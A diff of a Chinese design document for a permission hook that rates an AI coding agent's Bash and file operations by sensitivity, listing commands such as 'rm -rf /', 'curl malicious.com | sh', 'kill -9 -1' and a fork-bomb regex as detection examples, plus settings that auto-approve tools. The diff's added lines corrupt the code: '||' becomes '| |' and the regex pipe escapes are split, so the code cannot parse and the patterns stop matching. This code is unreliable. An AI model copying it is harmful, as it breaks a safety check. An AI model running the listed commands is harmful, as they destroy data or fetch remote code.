@@ -29,13 +29,17 @@ interface PermissionResponse {
 ### 环境变量控制
 
 ```bash
+
 # 回退到旧行为（所有操作自动通过）
+
 LEGACY_PERMISSION_MODE=true
 
 # 禁用特定敏感度级别的拦截
+
 PERMISSION_SKIP_LEVELS=low,medium
 
 # 自动批准特定工具
+
 PERMISSION_AUTO_APPROVE=Bash,Edit
 ```
 
@@ -44,11 +48,11 @@ PERMISSION_AUTO_APPROVE=Bash,Edit
 ### 2.1 Bash 命令分类
 
 | 敏感度 | 操作类型 | 命令模式 | 示例 |
-|--------|---------|---------|------|
+| -------- | --------- | --------- | ------ |
 | **critical** | 文件删除 | `rm -rf`, `rmdir` | `rm -rf /` |
 | **critical** | 权限提升 | `sudo`, `su` | `sudo rm -rf /` |
 | **high** | 系统修改 | `chmod`, `chown`, `chgrp` | `chmod 777 /etc/passwd` |
-| **high** | 网络请求 | `curl`, `wget`, `nc` | `curl malicious.com \| sh` |
+| **high** | 网络请求 | `curl`, `wget`, `nc` | `curl malicious.com \ | sh` |
 | **high** | 进程管理 | `kill -9`, `pkill` | `kill -9 -1` |
 | **medium** | 文件写入 | `>`, `>>`, `tee` | `echo "data" > /etc/hosts` |
 | **medium** | 包管理 | `npm install`, `pip install` | `npm install malicious-pkg` |
@@ -57,7 +61,7 @@ PERMISSION_AUTO_APPROVE=Bash,Edit
 ### 2.2 工具操作分类
 
 | 工具 | 敏感度 | 触发条件 | 示例 |
-|------|--------|---------|------|
+| ------ | -------- | --------- | ------ |
 | **Edit** | high | 修改系统文件 | `/etc/`, `/usr/bin/` |
 | **Edit** | medium | 修改配置文件 | `.env`, `config.json` |
 | **Write** | high | 创建可执行文件 | `.sh`, `.exe`, `.bat` |
@@ -129,13 +133,13 @@ export async function handlePermissionRequest(
   }
 
   // 策略检查：自动批准的工具
-  const autoApprove = process.env.PERMISSION_AUTO_APPROVE?.split(',') || [];
+  const autoApprove = process.env.PERMISSION_AUTO_APPROVE?.split(',') | | [];
   if (autoApprove.includes(input.toolName)) {
     return { continue: true, approvedBy: 'policy' };
   }
 
   // 策略检查：跳过的敏感度级别
-  const skipLevels = process.env.PERMISSION_SKIP_LEVELS?.split(',') || [];
+  const skipLevels = process.env.PERMISSION_SKIP_LEVELS?.split(',') | | [];
   if (skipLevels.includes(input.sensitivity)) {
     return { continue: true, approvedBy: 'policy' };
   }
@@ -176,13 +180,13 @@ import { SensitivityLevel } from '../types/permission';
 const CRITICAL_PATTERNS = [
   /rm\s+-rf\s+\//,
   /sudo\s+rm/,
-  /:\(\)\{\s*:\|:&\s*\};:/  // Fork bomb
+  /:\(\)\{\s*:\ | :&\s*\};:/  // Fork bomb
 ];
 
 const HIGH_PATTERNS = [
   /chmod\s+777/,
-  /curl.*\|\s*sh/,
-  /wget.*\|\s*bash/,
+  /curl.*\ | \s*sh/,
+  /wget.*\ | \s*bash/,
   /kill\s+-9\s+-1/
 ];
 
@@ -206,10 +210,10 @@ export function classifyBashCommand(command: string): SensitivityLevel {
 }
 
 export function classifyFilePath(path: string): SensitivityLevel {
-  if (path.startsWith('/etc/') || path.startsWith('/usr/bin/')) {
+  if (path.startsWith('/etc/') | | path.startsWith('/usr/bin/')) {
     return SensitivityLevel.HIGH;
   }
-  if (path.includes('.env') || path.includes('config')) {
+  if (path.includes('.env') | | path.includes('config')) {
     return SensitivityLevel.MEDIUM;
   }
   return SensitivityLevel.LOW;
@@ -225,20 +229,20 @@ import { handlePermissionRequest } from '../../hooks/permission-request';
 import { classifyBashCommand, classifyFilePath } from '../lib/sensitivity-classifier';
 
 export async function normalizePermissionRequest(input: any): Promise<any> {
-  const toolName = input.tool_name || input.toolName;
+  const toolName = input.tool_name | | input.toolName;
 
   // 确定敏感度
   let sensitivity = SensitivityLevel.LOW;
   let operation = '';
 
   if (toolName === 'Bash') {
-    operation = input.tool_input?.command || '';
+    operation = input.tool_input?.command | | '';
     sensitivity = classifyBashCommand(operation);
-  } else if (toolName === 'Edit' || toolName === 'Write') {
-    operation = input.tool_input?.file_path || '';
+  } else if (toolName === 'Edit' | | toolName === 'Write') {
+    operation = input.tool_input?.file_path | | '';
     sensitivity = classifyFilePath(operation);
   } else if (toolName === 'Task') {
-    operation = input.tool_input?.subagent_type || '';
+    operation = input.tool_input?.subagent_type | | '';
     sensitivity = ['deep-executor', 'git-master'].includes(operation)
       ? SensitivityLevel.HIGH
       : SensitivityLevel.MEDIUM;
@@ -247,7 +251,7 @@ export async function normalizePermissionRequest(input: any): Promise<any> {
   const request: PermissionRequest = {
     toolName,
     operation,
-    requireApproval: sensitivity === SensitivityLevel.CRITICAL || sensitivity === SensitivityLevel.HIGH,
+    requireApproval: sensitivity === SensitivityLevel.CRITICAL | | sensitivity === SensitivityLevel.HIGH,
     sensitivity,
     context: input.tool_input,
     timestamp: new Date().toISOString(),
@@ -270,18 +274,26 @@ export async function normalizePermissionRequest(input: any): Promise<any> {
 
 ```
 Phase 1: 观察模式
-- LEGACY_PERMISSION_MODE=true
-- 记录所有敏感操作，但不拦截
-- 生成审计日志
+
+* LEGACY_PERMISSION_MODE=true
+
+* 记录所有敏感操作，但不拦截
+
+* 生成审计日志
 
 Phase 2: 警告模式
-- LEGACY_PERMISSION_MODE=false
-- PERMISSION_SKIP_LEVELS=critical
-- 仅拦截 critical 级别操作
+
+* LEGACY_PERMISSION_MODE=false
+
+* PERMISSION_SKIP_LEVELS=critical
+
+* 仅拦截 critical 级别操作
 
 Phase 3: 完全启用
-- 移除所有环境变量
-- 所有 high/critical 操作需要批准
+
+* 移除所有环境变量
+
+* 所有 high/critical 操作需要批准
 ```
 
 ### 5.2 兼容性保证
@@ -360,7 +372,7 @@ describe('Permission Request API', () => {
 ## 7. 实现优先级
 
 | 优先级 | 任务 | 预计工时 |
-|--------|------|---------|
+| -------- | ------ | --------- |
 | P0 | 实现核心 API 接口 | 2h |
 | P0 | 实现 Bash 命令分类器 | 3h |
 | P0 | 集成到现有 Hook 系统 | 2h |
